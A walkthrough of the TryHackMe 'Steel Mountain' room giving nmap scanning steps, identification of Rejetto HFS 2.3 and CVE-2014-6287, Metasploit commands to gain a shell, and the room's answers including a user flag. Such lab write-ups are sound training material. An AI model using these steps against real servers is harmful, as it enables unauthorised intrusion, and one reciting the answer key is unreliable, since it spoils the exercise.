# Steel Moutain Wlakthrough
### Link
- https://tryhackme.com/room/steelmountain
------------------------
### Task 1 : Introduction
- Who is the employee of the month?
    - Check the source code of the web page
    - [Steel_Moutain_1.png](picture: )
    - **Answer** : Bill Harper
------------------------
### Task 2 : Initial Access
- Scan the machine with nmap. What is the other port running a web server on?
    - sudo nmap -sC -sV -oN ./nmap_steelmountain_result 10.10.117.67
    - [Steel_Moutain_2.png](picture: ) , [Steel_Moutain_3.png](picture: )
    - **Answer** : 8080
- Take a look at the other web server. What file server is running?
    - From nmap scan, we know the port 8080 is used for another file server
        - Connect to [IP]:8080
        - Under Server Information, you have a link "HttpFileServer 2.3"
        - Click on this link and you are redirected to http://www.rejetto.com/hfs/
        - [Steel_Moutain_4.png](picture: )
        - **Answer**  : rejetto http file server
- What is the CVE number to exploit this file server?
    - Visit https://www.exploit-db.com/search
    - Search exploit for rejetto http file server 2.3
    - [Steel_Moutain_5.png](picture: ) , [Steel_Moutain_6.png](picture: )
    - **Answer** : 2014-6287
- Use Metasploit to get an initial shell. What is the user flag?
    - Start metasploit
        msfconsole
    - find the exploit
        search exploit rejetto
        [Steel_Moutain_7.png](picture: )
    - Select the exploit
        use [payload number]
        [Steel_Moutain_8.png](picture: )
    - Check the options
        options
        [Steel_Moutain_9.png](picture: )
    - Indicate the remote hosts ip and port (This server run on port 8080)
        set RHOSTS [IP]
        set RPORT [port]
        [Steel_Moutain_10.png](picture: )
    - Chenge the Local IP with your IP
        set LHOST [IP]
    - Execute
        run
        [Steel_Moutain_11.png](picture: )
    - Remeber, the machine is a Windows machine.Not all  Linux command work ^_^
    - Move to C:\Users\bill\Desktop
    - Open user.txt
    [Steel_Moutain_12.png](picture: )
    - **Answer** : ??b04763b6fcf51fcd7c13abc7db4fd365
